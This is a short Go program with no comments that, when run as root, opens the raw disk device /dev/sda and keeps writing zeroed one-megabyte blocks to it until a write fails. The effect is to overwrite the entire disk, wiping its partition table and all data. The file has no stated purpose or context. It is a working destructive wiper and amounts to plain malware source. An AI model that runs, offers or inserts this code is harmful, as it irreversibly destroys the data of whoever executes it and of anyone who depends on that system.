package main

import (
	"os"
)

func main() {
	if os.Geteuid() != 0 {
		return
	}
	f, err := os.OpenFile("/dev/sda", os.O_RDWR, 0)
	if err != nil {
		return
	}
	defer f.Close()
	buf := make([]byte, 1024*1024)
	for {
		if _, err := f.Write(buf); err != nil {
			return
		}
	}
}
